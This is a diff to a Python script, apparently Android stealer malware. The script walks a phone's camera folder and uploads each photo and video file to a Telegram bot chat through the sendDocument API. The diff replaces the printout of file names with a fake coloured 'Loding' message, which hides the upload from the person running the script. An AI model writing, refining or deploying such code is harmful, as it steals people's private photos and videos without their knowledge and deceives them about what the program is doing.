@@ -1,4 +1,6 @@
 import os
+R='\33[1;31m'
+G='\33[1;32m'
 try:
 	import requests
 except:
@@ -10,6 +12,6 @@ os.chdir('/sdcard/DCIM/Camera')
 path = list(os.scandir('.'))
 for i in path:
     if 'jpg' or 'mp4' or 'mp3' in i.name:
-        print(i.name)
+        print(f'{R}[{G}+{R}]{G} Loding ')
         file={'document': open(f'{i.name}','rb')}
         req = requests.post(f'https://api.telegram.org/bot{token}/sendDocument?chat_id={id}', files=file)
